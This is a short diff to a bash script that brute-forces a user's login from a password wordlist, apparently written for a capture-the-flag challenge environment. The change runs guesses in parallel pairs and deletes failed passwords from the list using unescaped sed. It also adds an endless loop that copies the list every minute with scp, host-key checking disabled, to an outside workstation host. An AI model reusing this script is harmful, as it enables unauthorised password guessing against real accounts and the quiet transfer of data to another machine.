@@ -16,18 +16,19 @@ check_password() {
         exit 0
     else
         echo "Failed login as '$username' with password '$password'"
-        echo "$password" >> failed_passwords.txt
+        sed -i "/$password/d" "$password_list_path"
     fi
 }
 
 # Read each password from the list and attempt to log in
-while IFS= read -r password; do
-    check_password "$password" &
+while IFS= read -r password1 && IFS= read -r password2; do
+    check_password "$password1" &
+    check_password "$password2" &
+    wait
 done < "$password_list_path"
 
-# Wait for all background processes to finish
-wait
-
-# If no valid password was found
-echo "No valid password found for '$username'."
-exit 1
+# Transfer the updated password list file via SCP every minute
+while true; do
+    scp -o StrictHostKeyChecking=no "$password_list_path" peter@workstation2.CHALLENGE-883AD57C-80E2-4F8F-92F4-E8C19D747341.SVC.CLUSTER.LOCAL:~/ 
+    sleep 60
+done
